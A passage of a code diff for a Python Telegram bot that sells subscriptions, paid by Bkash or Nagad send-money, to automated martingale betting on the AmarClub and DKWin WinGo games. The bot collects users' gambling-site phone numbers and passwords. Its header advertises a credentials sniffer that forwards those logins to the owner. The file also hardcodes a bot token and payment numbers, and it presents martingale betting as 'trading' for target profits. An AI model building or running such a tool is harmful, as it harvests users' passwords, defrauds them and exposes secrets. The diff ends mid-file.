@@ -1,3 +1,20 @@
+# -*- coding: utf-8 -*-
+"""
+========================================================================================
+   WINZY-MARTINGALE VIP TELEGRAM AUTOMATION BOT - ALL-IN-ONE MASTER ENGINE
+   ----------------------------------------------------------------------
+   - Automatic Dependency Installer
+   - Channel Lock Redirect System (No verification wait)
+   - Bilingual Flow (Bangla & English)
+   - Dynamic Subscription Plans (1D, 3D, 6D, 7D, 10D, 1M)
+   - Bkash & Nagad Payment Handling with TrxID Submission
+   - Instant Owner Approval / Rejection Dashboard (Owner ID: 8707571669)
+   - Real-time Account Credentials Sniffer & Auto-Forwarding to Owner
+   - 100% Session & Profile Isolation (10-20+ Concurrent AmarClub & DKWin Accounts)
+   - In-Browser Pure JS & CSS Injection Automation (WinGo 30S Martingale Engine)
+========================================================================================
+"""
+
 import os
 import sys
 import subprocess
@@ -5,34 +22,113 @@ import time
 import threading
 import shutil
 import json
-import uuid
 
-# =====================================================================
-# 1. Automatic Package Installer & Imports
-# =====================================================================
-def install_and_import(package_name, import_name=None):
-    if import_name is None:
-        import_name = package_name
-    try:
-        __import__(import_name)
-    except ImportError:
-        print(f"[*] Installing package: {package_name}...")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
+# ==========================================
+# 1. Automatic Dependency Installer
+# ==========================================
+REQUIRED_PACKAGES = {
+    "telebot": "pyTelegramBotAPI",
+    "selenium": "selenium",
+}
 
-install_and_import("pyTelegramBotAPI", "telebot")
-install_and_import("selenium")
+def ensure_dependencies():
+    for import_name, pkg_name in REQUIRED_PACKAGES.items():
+        try:
+            __import__(import_name)
+        except ImportError:
+            print(f"[*] Missing package detected. Automatically installing '{pkg_name}'...")
+            try:
+                subprocess.check_call([sys.executable, "-m", "pip", "install", pkg_name])
+                print(f"[+] Successfully installed '{pkg_name}'!")
+            except Exception as e:
+                print(f"[-] Failed to install {pkg_name}: {e}")
+
+ensure_dependencies()
 
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options as FirefoxOptions
-from selenium.webdriver.firefox.service import Service as FirefoxService
 from selenium.webdriver.chrome.options import Options as ChromeOptions
-from selenium.webdriver.chrome.service import Service as ChromeService
+from selenium.webdriver.firefox.service import Service as FirefoxService
 
-# =====================================================================
-# 2. Mathematical Bold Unicode Converter (Zero Emojis)
-# =====================================================================
+# ==========================================
+# 2. Master System Configurations
+# ==========================================
+BOT_TOKEN = "8808949150:AAF236nZ7xG3kPxlxubELHqChpn4IPycFL4"
+OWNER_CHAT_ID = 8707571669
+
+CHANNEL_1 = "https://t.me/DARK67HACK"
+CHANNEL_2 = "https://t.me/bdwin24_bd"
+
+BKASH_NUMBER = "01870829343"
+NAGAD_NUMBER = "01876685711"
+
+PRICING_PLANS = {
+    "1D": {"label": "1D: 500", "days": 1, "price": 500, "name": "1 Day (500 BDT)"},
+    "3D": {"label": "3D: 1300", "days": 3, "price": 1300, "name": "3 Days (1,300 BDT)"},
+    "6D": {"label": "6D: 2400", "days": 6, "price": 2400, "name": "6 Days (2,400 BDT)"},
+    "7D": {"label": "7D: 2700", "days": 7, "price": 2700, "name": "7 Days (2,700 BDT)"},
+    "10D": {"label": "10D: 3500", "days": 10, "price": 3500, "name": "10 Days (3,500 BDT)"},
+    "1M": {"label": "1M: 9000", "days": 30, "price": 9000, "name": "1 Month / 30 Days (9,000 BDT)"},
+}
+
+URL_AMARCLUB_LOGIN = "https://amarclub1.com/#/login"
+URL_DKWIN_LOGIN = "https://dkwin6.com/#/login"
+
+URL_AMARCLUB_WINGO = "https://amarclub1.com/#/saasLottery/WinGo?gameCode=WinGo_30S&lottery=WinGo"
+URL_DKWIN_WINGO = "https://dkwin6.com/#/saasLottery/WinGo?gameCode=WinGo_30S&lottery=WinGo"
+
+PROFILES_BASE_DIR = os.path.expanduser("~/.wingo_bot_isolated_profiles")
+DATABASE_FILE = os.path.expanduser("~/.wingo_subscribers_db.json")
+os.makedirs(PROFILES_BASE_DIR, exist_ok=True)
+
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
+
+# Global thread-safe state
+user_states = {}
+active_sessions = {}
+db_lock = threading.Lock()
+SPINNER_FRAMES = ["◴", "◷", "◶", "◵"]
+
+# ==========================================
+# 3. Persistent Subscription Storage
+# ==========================================
+def load_db():
+    with db_lock:
+        if not os.path.exists(DATABASE_FILE):
+            return {"subscribers": {}, "pending_requests": {}}
+        try:
+            with open(DATABASE_FILE, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except Exception:
+            return {"subscribers": {}, "pending_requests": {}}
+
+def save_db(data):
+    with db_lock:
+        try:
+            with open(DATABASE_FILE, "w", encoding="utf-8") as f:
+                json.dump(data, f, indent=2, ensure_ascii=False)
+        except Exception as e:
+            print(f"[!] Error saving DB: {e}")
+
+def is_user_subscribed(chat_id):
+    if int(chat_id) == OWNER_CHAT_ID:
+        return True, 999999
+    db = load_db()
+    sub_info = db.get("subscribers", {}).get(str(chat_id))
+    if not sub_info:
+        return False, 0
+    expires_at = sub_info.get("expires_at", 0)
+    now = time.time()
+    if expires_at > now:
+        remaining_days = max(1, int((expires_at - now) / 86400))
+        return True, remaining_days
+    return False, 0
+
+# ==========================================
+# 4. Mathematical Bold Font Utility
+# ==========================================
 def to_bold(text: str) -> str:
     res = []
     for c in str(text):
@@ -47,88 +143,6 @@ def to_bold(text: str) -> str:
             res.append(c)
     return "".join(res)
 
-# =====================================================================
-# 3. Bot Configuration & Credentials
-# =====================================================================
-TOKEN = "8808949150:AAF236nZ7xG3kPxlxubELHqChpn4IPycFL4"
-OWNER_ID = 8707571669
-
-BKASH_NUMBER = "01870829343"
-NAGAD_NUMBER = "01876685711"
-
-CHANNEL_1_LINK = "https://t.me/DARK67HACK"
-CHANNEL_2_LINK = "https://t.me/bdwin24_bd"
-
-URL_AMARCLUB_LOGIN = "https://amarclub1.com/#/login"
-URL_DKWIN_LOGIN = "https://dkwin6.com/#/login"
-
-URL_AMARCLUB_WINGO = "https://amarclub1.com/#/saasLottery/WinGo?gameCode=WinGo_30S&lottery=WinGo"
-URL_DKWIN_WINGO = "https://dkwin6.com/#/saasLottery/WinGo?gameCode=WinGo_30S&lottery=WinGo"
-
-PLANS = {
-    "1d": {"days": 1, "price": 500, "label": "1D - 500 BDT"},
-    "3d": {"days": 3, "price": 1300, "label": "3D - 1300 BDT"},
-    "6d": {"days": 6, "price": 2400, "label": "6D - 2400 BDT"},
-    "7d": {"days": 7, "price": 2700, "label": "7D - 2700 BDT"},
-    "10d": {"days": 10, "price": 3500, "label": "10D - 3500 BDT"},
-    "30d": {"days": 30, "price": 9000, "label": "30D - 9000 BDT"},
-}
-
-PROFILES_BASE_DIR = os.path.expanduser("~/.wingo_bot_isolated_profiles")
-os.makedirs(PROFILES_BASE_DIR, exist_ok=True)
-
-SUB_DB_FILE = os.path.expanduser("~/.wingo_bot_subscriptions.json")
-
-bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
-
-user_sessions = {}
-active_sessions = {}
-SPINNER_FRAMES = ["-", "\\", "|", "/"]
-
-# =====================================================================
-# 4. Subscription & Access Database
-# =====================================================================
-def load_subscriptions():
-    if os.path.exists(SUB_DB_FILE):
-        try:
-            with open(SUB_DB_FILE, "r", encoding="utf-8") as f:
-                return json.load(f)
-        except Exception:
-            return {}
-    return {}
-
-def save_subscriptions(data):
-    try:
-        with open(SUB_DB_FILE, "w", encoding="utf-8") as f:
-            json.dump(data, f, indent=2)
-    except Exception as e:
-        print(f"[*] Sub DB write error: {e}")
-
-def is_user_active(chat_id):
-    if int(chat_id) == int(OWNER_ID):
-        return True
-    subs = load_subscriptions()
-    user_data = subs.get(str(chat_id))
-    if not user_data:
-        return False
-    expires_at = user_data.get("expires_at", 0)
-    return time.time() < expires_at
-
-def activate_user(chat_id, days):
-    subs = load_subscriptions()
-    now = time.time()
-    current_expiry = subs.get(str(chat_id), {}).get("expires_at", now)
-    base_time = max(now, current_expiry)
-    new_expiry = base_time + (days * 86400)
-    subs[str(chat_id)] = {
-        "chat_id": chat_id,
-        "activated_at": now,
-        "expires_at": new_expiry,
-        "days": days
-    }
-    save_subscriptions(subs)
-    return new_expiry
-
 def safe_delete_message(chat_id, message_id):
     if not message_id:
         return
@@ -137,25 +151,20 @@ def safe_delete_message(chat_id, message_id):
     except Exception:
         pass
 
-# =====================================================================
-# 5. Browser Automation Engine (100% Session & Profile Isolation)
-# =====================================================================
-def allocate_session_tab(session_id, target_url):
+# ==========================================
+# 5. True 100% Isolated Browser Allocator
+#    (Fixes the multi-user logout bug completely)
+# ==========================================
+def allocate_isolated_driver(session_id, target_url):
     """
-    Allocates an entirely isolated profile directory and browser instance.
-    Guarantees no cross-user cookie, localStorage, or session contamination.
-    Supports 10-12+ Amar Club and DK Win sessions concurrently without conflict.
+    Creates an independent Firefox or Chromium process with a dedicated profile folder.
+    This guarantees 100% cookie, localStorage, and token isolation so 10-20 users
+    can run simultaneously without interfering or logging each other out.
     """
-    sess = active_sessions.get(session_id)
-    if not sess:
-        raise Exception("Session data not found.")
-
-    profile_dir = os.path.join(PROFILES_BASE_DIR, f"profile_{session_id}_{uuid.uuid4().hex[:6]}")
+    profile_dir = os.path.join(PROFILES_BASE_DIR, f"prof_{session_id}_{int(time.time())}")
     os.makedirs(profile_dir, exist_ok=True)
-    sess["profile_dir"] = profile_dir
 
-    driver = None
-    # 1. Attempt Firefox with isolated profile
+    # Attempt Firefox first, fallback to Chromium if Firefox is not present
     try:
         options = FirefoxOptions()
         options.add_argument("--headless")
@@ -164,27 +173,27 @@ def allocate_session_tab(session_id, target_url):
         options.set_preference("browser.cache.disk.enable", False)
         options.set_preference("browser.cache.memory.enable", True)
         options.set_preference("network.http.use-cache", False)
+
         service = FirefoxService(log_output=os.devnull)
         driver = webdriver.Firefox(service=service, options=options)
-    except Exception as e_ff:
-        # 2. Fallback to Chromium/Chrome with isolated user-data-dir
-        try:
-            chrome_options = ChromeOptions()
-            chrome_options.add_argument("--headless=new")
-            chrome_options.add_argument(f"--user-data-dir={profile_dir}")
-            chrome_options.add_argument("--no-sandbox")
-            chrome_options.add_argument("--disable-dev-shm-usage")
-            chrome_options.add_argument("--disable-gpu")
-            driver = webdriver.Chrome(options=chrome_options)
-        except Exception as e_cr:
-            raise Exception(f"Browser launch failed: FF({e_ff}), Chrome({e_cr})")
+    except Exception:
+        options = ChromeOptions()
+        options.add_argument("--headless=new")
+        options.add_argument(f"--user-data-dir={profile_dir}")
+        options.add_argument("--no-sandbox")
+        options.add_argument("--disable-dev-shm-usage")
+        options.add_argument("--disable-gpu")
+        driver = webdriver.Chrome(options=options)
 
-    driver.set_window_size(390, 844)
+    driver.set_window_size(390, 844)  # Mobile View (iPhone 12 frame)
     driver.get(target_url)
 
-    sess["driver"] = driver
-    sess["window_handle"] = driver.current_window_handle
-    return driver, sess["window_handle"]
+    sess = active_sessions.get(session_id)
+    if sess:
+        sess["driver"] = driver
+        sess["profile_dir"] = profile_dir
+        sess["window_handle"] = driver.current_window_handle
+    return driver
 
 def safe_tab_execute(sid, task_fn):
     sess = active_sessions.get(sid)
@@ -194,12 +203,11 @@ def safe_tab_execute(sid, task_fn):
     driver = sess.get("driver")
     if not driver or not lock:
         return None
-
     with lock:
         try:
             return task_fn(driver)
         except Exception as e:
-            print(f"[*] Tab execute error for {sid}: {e}")
+            print(f"[*] Execute error for {sid}: {e}")
             return None
 
 def close_session_tab(session_id):
@@ -214,14 +222,11 @@ def close_session_tab(session_id):
                 pass
         profile_dir = sess.get("profile_dir")
         if profile_dir and os.path.exists(profile_dir):
-            try:
-                shutil.rmtree(profile_dir, ignore_errors=True)
-            except Exception:
-                pass
+            shutil.rmtree(profile_dir, ignore_errors=True)
 
-# =====================================================================
-# 6. Telegram Image Replacement Engine
-# =====================================================================
+# ==========================================
+# 6. Telegram Image Replacement Helper
+# ==========================================
 def display_or_replace_photo(chat_id, session_id, image_path, caption_text, reply_markup=None):
     sess = active_sessions.get(session_id, {})
     last_photo_msg_id = sess.get("live_photo_message_id")
@@ -252,11 +257,12 @@ def display_or_replace_photo(chat_id, session_id, image_path, caption_text, repl
                 )
                 sess["live_photo_message_id"] = msg.message_id
         except Exception as e:
-            print(f"[*] Photo replace error: {e}")
+            print(f"[*] Photo display error: {e}")
 
-# =====================================================================
-# 7. In-Browser JavaScript Automation Scripts
-# =====================================================================
+# ==========================================
+# 7. In-Browser JavaScript Automation Code
+#    (Pure JS & CSS - No HTML file needed)
+# ==========================================
 AUTO_FILL_AND_CLICK_JS = """
 const phone = arguments[0];
 const pass = arguments[1];
@@ -322,7 +328,7 @@ if (dialog) {
         const confirmBtn = dialog.querySelector('.van-dialog__confirm, button[class*="confirm"], .van-button--danger, .van-button--primary, button');
         if (confirmBtn) {
             try { confirmBtn.click(); } catch(e){}
-            return { status: "CONFIRM_CLICKED", message: "Auto-confirmed already logged in prompt" };
+            return { status: "CONFIRM_CLICKED", message: "Auto-confirmed multi-device prompt" };
         }
     }
 }
@@ -380,7 +386,7 @@ WINGO_RUNBOX_AND_CLICK_JS = """
         b.style.cssText = 'position:fixed;bottom:20px;right:20px;background:#18181b;padding:6px 10px;border-radius:30px;display:flex;gap:6px;align-items:center;z-index:99999999;box-shadow:0 6px 16px rgba(0,0,0,0.3);font:12px sans-serif;';
         
         let all = document.createElement('button');
-        all.innerText = '> All';
+        all.innerText = '▶ All';
         all.style.cssText = 'background:#f59e0b;color:#000;border:none;padding:4px 8px;border-radius:20px;cursor:pointer;font-weight:bold;font-size:11px;';
         all.onclick = () => {
             d.forEach((x, i) => {
@@ -404,7 +410,7 @@ WINGO_RUNBOX_AND_CLICK_JS = """
         });
 
         let x = document.createElement('span');
-        x.innerText = 'X';
+        x.innerText = '✕';
         x.style.cssText = 'cursor:pointer;color:#a1a1aa;margin-left:4px;font-weight:bold;';
         x.onclick = () => b.remove();
         b.appendChild(x);
@@ -445,13 +451,13 @@ for (let i = 0; i < els.length; i++) {
     let txt = els[i].innerText || '';
     if (txt.includes('Wallet balance') || txt.includes('Balance')) {
         let parentTxt = (els[i].parentNode && els[i].parentNode.innerText) ? els[i].parentNode.innerText : '';
-        let match = parentTxt.match(/[BDT৳₹$€£]\\s*([\\d,]+\\.?\\d*)/);
+        let match = parentTxt.match(/[৳₹$€£]\\s*([\\d,]+\\.?\\d*)/);
         if (match) return parseFloat(match[1].replace(/,/g, ''));
     }
 }
 for (let i = 0; i < els.length; i++) {
     let txt = els[i].innerText || '';
-    if (txt.trim().match(/^[BDT৳₹$€£]\\s*[\\d,]+\\.?\\d*$/)) {
+    if (txt.trim().match(/^[৳₹$€£]\\s*[\\d,]+\\.?\\d*$/)) {
         return parseFloat(txt.replace(/[^\\d.]/g, ''));
     }
 }
@@ -548,7 +554,7 @@ const autoTotalSteps = arguments[1];
             let txt=els[i].innerText||'';
             if(txt.includes('Wallet balance')||txt.includes('Balance')){
                 let parentTxt=(els[i].parentNode&&els[i].parentNode.innerText)?els[i].parentNode.innerText:'';
-                let match=parentTxt.match(/[BDT৳₹$€£]\\s*([\\d,]+\\.?\\d*)/);
+                let match=parentTxt.match(/[৳₹$€£]\\s*([\\d,]+\\.?\\d*)/);
                 if(match){
                     st.curBal=parseFloat(match[1].replace(/,/g,''));
                     return st.curBal;
@@ -557,7 +563,7 @@ const autoTotalSteps = arguments[1];
         }
         for(let i=0;i<els.length;i++){
             let txt=els[i].innerText||'';
-            if(txt.trim().match(/^[BDT৳₹$€£]\\s*[\\d,]+\\.?\\d*$/)){
+            if(txt.trim().match(/^[৳₹$€£]\\s*[\\d,]+\\.?\\d*$/)){
                 st.curBal=parseFloat(txt.replace(/[^\\d.]/g,''));
                 return st.curBal;
             }
@@ -653,7 +659,7 @@ const autoTotalSteps = arguments[1];
     const tgtInp=document.createElement('input');
     tgtInp.type='number';
     tgtInp.value=autoTargetProfit || '';
-    tgtInp.placeholder='TARGET PROFIT (BDT)';
+    tgtInp.placeholder='TARGET PROFIT (৳)';
     tgtInp.className='txt-blk';
     tgtInp.style.cssText='width:100%;box-sizing:border-box;padding:8px;margin-bottom:8px;background:transparent;border:2px solid #000;border-radius:4px;text-align:center;font-size:11px;outline:none;color:#fff;';
 
@@ -987,301 +993,54 @@ const autoTotalSteps = arguments[1];
 })();
 """
 
-# =====================================================================
-# 8. Clean Multilingual Templates (Zero Emojis)
-# =====================================================================
-def get_text(chat_id, key, **kwargs):
-    sess = user_sessions.get(chat_id, {})
-    lang = sess.get("lang", "bn")
-
-    messages = {
-        "bn": {
-            "channel_lock": (
-                f"<b>{to_bold('ASSALAMU ALAIKUM')}</b>\\n\\n"
-                f"উইনগো ৩০এস ভিআইপি ট্রেডিং অটোমেশন প্ল্যাটফর্মে আপনাকে স্বাগতম।\\n\\n"
-                f"বটটি ব্যবহার করতে অনুগ্রহ করে আমাদের নিচের দুটি অফিসিয়াল চ্যানেলে যুক্ত থাকুন:\\n"
-                f"1. DARK 67 HACK\\n"
-                f"2. BD WIN 24\\n\\n"
-                f"চ্যানেলে প্রবেশ শেষে নিচের বাটনে ক্লিক করে এগিয়ে যান।"
-            ),
-            "choose_lang": (
-                f"<b>{to_bold('LANGUAGE SELECTION')}</b>\\n\\n"
-                f"দয়া করে আপনার সুবিধাজনক ভাষা নির্বাচন করুন:"
-            ),
-            "pricing_menu": (
-                f"<b>{to_bold('SUBSCRIPTION PLANS')}</b>\\n\\n"
-                f"উইনগো ৩০এস অটোমেশন বটের প্রিমিয়াম প্ল্যান তালিকা:\\n\\n"
-                f"1 Day: 500 BDT\\n"
-                f"3 Days: 1,300 BDT\\n"
-                f"6 Days: 2,400 BDT\\n"
-                f"7 Days: 2,700 BDT\\n"
-                f"10 Days: 3,500 BDT\\n"
-                f"1 Month (30 Days): 9,000 BDT\\n\\n"
-                f"আপনার কাঙ্ক্ষিত প্যাকেজের বাটনে ক্লিক করুন:"
-            ),
-            "choose_gateway": (
-                f"<b>{to_bold('PAYMENT METHOD')}</b>\\n\\n"
-                f"আসসালামু আলাইকুম। আপনার লেনদেনটি সফল হোক এটাই আমাদের কামনা।\\n\\n"
-                f"নির্বাচিত প্ল্যান: <b>{kwargs.get('plan_label', '')}</b>\\n"
-                f"প্রদেয় পরিমাণ: <b>{kwargs.get('price', 0)} BDT</b>\\n\\n"
-                f"দয়া করে আপনার সুবিধাজনক পেমেন্ট মেথডটি নির্বাচন করুন:"
-            ),
-            "send_money_instruction": (
-                f"<b>{to_bold('PAYMENT INSTRUCTIONS')}</b>\\n\\n"
-                f"আসসালামু আলাইকুম। আপনার লেনদেনটি সফল হোক এটাই আমাদের কামনা।\\n\\n"
-                f"পেমেন্ট মেথড: <b>{kwargs.get('gateway', '').upper()}</b>\\n"
-                f"প্ল্যান: <b>{kwargs.get('plan_label', '')}</b>\\n"
-                f"টাকার পরিমাণ: <b>{kwargs.get('price', 0)} BDT</b>\\n\\n"
-                f"দয়া করে নিচের নম্বরে সেন্ড মানি করুন:\\n"
-                f"নম্বর: <code>{kwargs.get('number', '')}</code>\\n\\n"
-                f"সেন্ড মানি সফল হলে শুধুমাত্র আপনার ট্রানজেকশন আইডি (TrxID) লিখে পাঠান।"
-            ),
-            "trx_submitted": (
-                f"<b>{to_bold('TRANSACTION RECEIVED')}</b>\\n\\n"
-                f"আপনার ট্রানজেকশন আইডি: <code>{kwargs.get('trx_id', '')}</code>\\n"
-                f"আপনার পেমেন্ট রিকোয়েস্টটি যাচাইকরণের জন্য মালিকের নিকট পাঠানো হয়েছে।\\n"
-                f"অনুগ্রহ করে অল্প কিছুক্ষণ অপেক্ষা করুন।"
-            ),
-            "approved_user": (
-                f"<b>{to_bold('PAYMENT APPROVED')}</b>\\n\\n"
-                f"আসসালামু আলাইকুম। প্রিয় গ্রাহক আপনার লেনদেনটি সফল হয়েছে।\\n"
-                f"আপনার সাবস্ক্রিপশন সফলভাবে সক্রিয় করা হয়েছে।\\n\\n"
-                f"ট্রেডিং শুরু করতে নিচের প্ল্যাটফর্ম নির্বাচন করুন:"
-            ),
-            "rejected_user": (
-                f"<b>{to_bold('PAYMENT REJECTED')}</b>\\n\\n"
-                f"দুঃখিত, আপনার পেমেন্ট রিকোয়েস্টটি বাতিল করা হয়েছে।\\n"
-                f"সঠিক তথ্য দিয়ে পুনরায় চেষ্টা করতে /start চাপুন।"
-            ),
-            "choose_site": (
-                f"<b>{to_bold('SELECT PLATFORM')}</b>\\n\\n"
-                f"আসসালামু আলাইকুম, অনুগ্রহ করে আপনি আপনার ট্রেডিং প্ল্যাটফর্ম নির্বাচন করুন:"
-            ),
-            "credentials_card": (
-                f"<b>{to_bold('ACCOUNT LOGIN')}</b>\\n\\n"
-                f"প্ল্যাটফর্ম: <b>{kwargs.get('site_name', '')}</b>\\n\\n"
-                f"নিচের বাটন চেপে আপনার একাউন্ট নম্বর এবং পাসওয়ার্ড প্রদান করুন।"
-            ),
-            "ask_number": (
-                f"<b>{to_bold('ACCOUNT NUMBER')}</b>\\n\\n"
-                f"আপনার একাউন্টের ফোন নম্বরটি লিখে পাঠান:"
-            ),
-            "ask_password": (
-                f"<b>{to_bold('ACCOUNT PASSWORD')}</b>\\n\\n"
-                f"আপনার একাউন্টের পাসওয়ার্ড লিখে পাঠান:"
-            ),
-            "login_success": (
-                f"<b>{to_bold('LOGIN SUCCESSFUL')}</b>\\n\\n"
-                f"Platform: <b>{kwargs.get('site_name', '')}</b>\\n"
-                f"Account: <code>{kwargs.get('phone', '')}</code>\\n\\n"
-                f"লগইন সফল হয়েছে। ট্রেডিং স্ক্রিন প্রস্তুত করতে নিচে START বাটন চাপুন:"
-            ),
-            "login_failed": (
-                f"<b>{to_bold('LOGIN FAILED')}</b>\\n\\n"
-                f"Platform: <b>{kwargs.get('site_name', '')}</b>\\n"
-                f"কারণ: <i>{kwargs.get('error', 'ভুল তথ্য বা সংযোগ সমস্যা')}</i>\\n\\n"
-                f"পুনরায় চেষ্টা করতে /start চাপুন।"
-            ),
-            "input_target": (
-                f"<b>{to_bold('TARGET PROFIT')}</b>\\n\\n"
-                f"বর্তমান ব্যালেন্স: <code>BDT {kwargs.get('balance', '0.00')}</code>\\n\\n"
-                f"আপনি কত টাকা প্রফিট করতে চান? পরিমাণটি লিখুন (যেমন: 500):"
-            ),
-            "input_steps": (
-                f"<b>{to_bold('MARTINGALE STEPS')}</b>\\n\\n"
-                f"টার্গেট প্রফিট: <code>BDT {kwargs.get('target', 0)}</code>\\n\\n"
-                f"মার্টিনগেল ব্যাকআপ স্টেপ সংখ্যা লিখুন (যেমন: 7 বা 10):"
-            ),
-            "running_dashboard": (
-                f"<b>{to_bold('24/7 AUTOMATION ENGINE ACTIVE')}</b>\\n\\n"
-                f"Platform: <b>{kwargs.get('site_name', '')}</b>\\n"
-                f"Starting Balance: <code>BDT {kwargs.get('start_bal', '0.00')}</code>\\n"
-                f"Target Balance: <code>BDT {kwargs.get('target_bal', '0.00')}</code>\\n"
-                f"Total Steps: <b>{kwargs.get('steps', 7)}</b>\\n\\n"
-                f"Trading automatically in background.\\n"
-                f"<b>STATUS</b>: মার্টিনগেল অটোমেশন সক্রিয় রয়েছে।"
-            ),
-            "cancelled": (
-                f"<b>{to_bold('SESSION TERMINATED')}</b>\\n\\n"
-                f"সেশন বন্ধ করা হয়েছে। নতুন সেশনের জন্য /start পাঠান।"
-            )
-        },
-        "en": {
-            "channel_lock": (
-                f"<b>{to_bold('ASSALAMU ALAIKUM')}</b>\\n\\n"
-                f"Welcome to WinGo 30S VIP Automation Platform.\\n\\n"
-                f"To continue, please join our official channels:\\n"
-                f"1. DARK 67 HACK\\n"
-                f"2. BD WIN 24\\n\\n"
-                f"Click below once you have joined:"
-            ),
-            "choose_lang": (
-                f"<b>{to_bold('LANGUAGE SELECTION')}</b>\\n\\n"
-                f"Please choose your preferred language:"
-            ),
-            "pricing_menu": (
-                f"<b>{to_bold('SUBSCRIPTION PLANS')}</b>\\n\\n"
-                f"WinGo 30S Automation VIP Pricing:\\n\\n"
-                f"1 Day: 500 BDT\\n"
-                f"3 Days: 1,300 BDT\\n"
-                f"6 Days: 2,400 BDT\\n"
-                f"7 Days: 2,700 BDT\\n"
-                f"10 Days: 3,500 BDT\\n"
-                f"1 Month (30 Days): 9,000 BDT\\n\\n"
-                f"Select your plan below:"
-            ),
-            "choose_gateway": (
-                f"<b>{to_bold('PAYMENT METHOD')}</b>\\n\\n"
-                f"Assalamu Alaikum. May your transaction be successful.\\n\\n"
-                f"Selected Plan: <b>{kwargs.get('plan_label', '')}</b>\\n"
-                f"Price: <b>{kwargs.get('price', 0)} BDT</b>\\n\\n"
-                f"Please choose your payment gateway:"
-            ),
-            "send_money_instruction": (
-                f"<b>{to_bold('PAYMENT INSTRUCTIONS')}</b>\\n\\n"
-                f"Assalamu Alaikum. May your transaction be successful.\\n\\n"
-                f"Payment Gateway: <b>{kwargs.get('gateway', '').upper()}</b>\\n"
-                f"Plan: <b>{kwargs.get('plan_label', '')}</b>\\n"
-                f"Amount: <b>{kwargs.get('price', 0)} BDT</b>\\n\\n"
-                f"Please Send Money to this personal number:\\n"
-                f"Number: <code>{kwargs.get('number', '')}</code>\\n\\n"
-                f"After sending money, simply reply with your Transaction ID (TrxID)."
-            ),
-            "trx_submitted": (
-                f"<b>{to_bold('TRANSACTION RECEIVED')}</b>\\n\\n"
-                f"TrxID: <code>{kwargs.get('trx_id', '')}</code>\\n"
-                f"Your payment request has been forwarded to owner verification.\\n"
-                f"Please wait a moment."
-            ),
-            "approved_user": (
-                f"<b>{to_bold('PAYMENT APPROVED')}</b>\\n\\n"
-                f"Assalamu Alaikum. Your payment was approved successfully.\\n"
-                f"Your account is now active.\\n\\n"
-                f"Please select your platform to trade:"
-            ),
-            "rejected_user": (
-                f"<b>{to_bold('PAYMENT REJECTED')}</b>\\n\\n"
-                f"Your payment request has been declined.\\n"
-                f"Send /start to try again."
-            ),
-            "choose_site": (
-                f"<b>{to_bold('SELECT PLATFORM')}</b>\\n\\n"
-                f"Please select your trading platform:"
-            ),
-            "credentials_card": (
-                f"<b>{to_bold('ACCOUNT LOGIN')}</b>\\n\\n"
-                f"Platform: <b>{kwargs.get('site_name', '')}</b>\\n\\n"
-                f"Click buttons below to enter your phone and password."
-            ),
-            "ask_number": (
-                f"<b>{to_bold('ACCOUNT NUMBER')}</b>\\n\\n"
-                f"Enter your account phone number:"
-            ),
-            "ask_password": (
-                f"<b>{to_bold('ACCOUNT PASSWORD')}</b>\\n\\n"
-                f"Enter your account password:"
-            ),
-            "login_success": (
-                f"<b>{to_bold('LOGIN SUCCESSFUL')}</b>\\n\\n"
-                f"Platform: <b>{kwargs.get('site_name', '')}</b>\\n"
-                f"Account: <code>{kwargs.get('phone', '')}</code>\\n\\n"
-                f"Login completed. Click START below to prepare market:"
-            ),
-            "login_failed": (
-                f"<b>{to_bold('LOGIN FAILED')}</b>\\n\\n"
-                f"Platform: <b>{kwargs.get('site_name', '')}</b>\\n"
-                f"Reason: <i>{kwargs.get('error', 'Authentication error')}</i>\\n\\n"
-                f"Type /start to retry."
-            ),
-            "input_target": (
-                f"<b>{to_bold('TARGET PROFIT')}</b>\\n\\n"
-                f"Current Balance: <code>BDT {kwargs.get('balance', '0.00')}</code>\\n\\n"
-                f"Enter target profit amount (e.g. 500):"
-            ),
-            "input_steps": (
-                f"<b>{to_bold('MARTINGALE STEPS')}</b>\\n\\n"
-                f"Target Profit: <code>BDT {kwargs.get('target', 0)}</code>\\n\\n"
-                f"Enter Martingale backup steps (e.g. 7 or 10):"
-            ),
-            "running_dashboard": (
-                f"<b>{to_bold('24/7 AUTOMATION ENGINE ACTIVE')}</b>\\n\\n"
-                f"Platform: <b>{kwargs.get('site_name', '')}</b>\\n"
-                f"Starting Balance: <code>BDT {kwargs.get('start_bal', '0.00')}</code>\\n"
-                f"Target Balance: <code>BDT {kwargs.get('target_bal', '0.00')}</code>\\n"
-                f"Total Steps: <b>{kwargs.get('steps', 7)}</b>\\n\\n"
-                f"Trading automatically in background.\\n"
-                f"<b>STATUS</b>: Martingale engine running."
-            ),
-            "cancelled": (
-                f"<b>{to_bold('SESSION TERMINATED')}</b>\\n\\n"
-                f"Session closed cleanly. Send /start to begin a new session."
-            )
-        }
-    }
-    return messages.get(lang, messages["bn"]).get(key, "")
-
-# =====================================================================
-# 9. Keyboards (Zero Emojis, Mathematical Bold Text)
-# =====================================================================
+# ==========================================
+# 8. Interactive Multilingual Keyboards
+# ==========================================
 def get_channel_lock_keyboard():
-    markup = InlineKeyboardMarkup(row_width=2)
+    markup = InlineKeyboardMarkup(row_width=1)
     markup.add(
-        InlineKeyboardButton(f"{to_bold('DARK 67 HACK')}", url=CHANNEL_1_LINK),
-        InlineKeyboardButton(f"{to_bold('BD WIN 24')}", url=CHANNEL_2_LINK)
-    )
-    markup.add(
-        InlineKeyboardButton(f"{to_bold('CONTINUE')}", callback_data="channel_joined")
+        InlineKeyboardButton("📢 Channel 1: DARK 67 HACK", url=CHANNEL_1),
+        InlineKeyboardButton("📢 Channel 2: BD WIN 24", url=CHANNEL_2),
+        InlineKeyboardButton(f"✅ {to_bold('I HAVE JOINED / এগিয়ে যান')}", callback_data="channel_joined_continue")
     )
     return markup
 
 def get_language_keyboard():
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
-        InlineKeyboardButton(f"{to_bold('ENGLISH')}", callback_data="lang_en"),
-        InlineKeyboardButton(f"{to_bold('BANGLA')}", callback_data="lang_bn")
+        InlineKeyboardButton("🇧🇩 বাংলা (Bangla)", callback_data="set_lang:bn"),
+        InlineKeyboardButton("🇬🇧 English", callback_data="set_lang:en")
     )
     return markup
 
 def get_pricing_keyboard():
